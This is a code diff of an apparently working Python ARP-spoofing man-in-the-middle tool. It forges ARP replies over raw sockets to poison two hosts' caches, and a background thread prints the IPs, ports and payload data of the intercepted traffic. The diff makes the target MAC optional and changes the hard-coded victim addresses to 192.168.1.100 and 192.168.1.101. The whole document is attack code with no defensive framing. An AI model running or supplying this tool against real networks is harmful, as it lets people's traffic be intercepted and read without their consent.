@@ -1,12 +1,12 @@
+from threading import Thread
 from struct import *
 import subprocess
 import socket
 import sys
 import re
-from threading import Thread
 
 
-def arp_reply(target_ip, sender_ip, sender_mac = 0):
+def arp_reply(target_ip, sender_ip, target_mac = 0, sender_mac = 0):
 	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
 	s.bind(('enp0s3', socket.SOCK_RAW))
 
@@ -19,10 +19,11 @@ def arp_reply(target_ip, sender_ip, sender_mac = 0):
 	else:
 		sender_mac = pack('!6B', *[int(x, 16) for x in sender_mac.split(':')])
 
-	#ARPs for the targets mac address
-	target_mac = subprocess.check_output(['arping','-f',target_ip])
-	target_mac = re.search('([0-9A-F]{2}[:]){5}([0-9A-F]{2})', str(target_mac)).group(0)
-	target_mac = pack('6B', *[int(x, 16) for x in target_mac.split(':')])
+	#ARPs for the targets mac address if we dont have it
+	if target_mac == 0:
+		target_mac = subprocess.check_output(['arping','-f',target_ip])
+		target_mac = re.search('([0-9A-F]{2}[:]){5}([0-9A-F]{2})', str(target_mac)).group(0)
+		target_mac = pack('6B', *[int(x, 16) for x in target_mac.split(':')])
 
 	#Packs target and sender ip's
 	target_ip = pack('!4B', *[int(x) for x in target_ip.split('.')])
@@ -51,9 +52,12 @@ def arp_reply(target_ip, sender_ip, sender_mac = 0):
 	s.send(b''.join(arp_packet))
 	s.close()
 
-def mitm(host1, host2):
-	arp_reply(host1, host2)
-	arp_reply(host2, host1)
+	return target_mac
+
+def mitm(host1, host2, mac1 = 0, mac2 = 0):
+	host1_mac = arp_reply(host1, host2, mac1)
+	host2_mac = arp_reply(host2, host1, mac2)
+	return [host1_mac, host2_mac]
 
 def listen_to_incoming_packets(Host_One_IP, Host_Two_IP):
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
@@ -120,5 +124,5 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP):
         if srcIP == Host_One_IP or srcIP == Host_Two_IP or dstIP == Host_One_IP or dstIP == Host_Two_IP:
             print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + str(data))
 
-Thread(target=listen_to_incoming_packets, args=('127.0.0.1', '127.0.0.1')).start()
-mitm('10.14.10.49', '10.14.10.1')
+Thread(target=listen_to_incoming_packets, args=('192.168.1.100', '192.168.1.101')).start()
+mitm('192.168.1.100', '192.168.1.101')
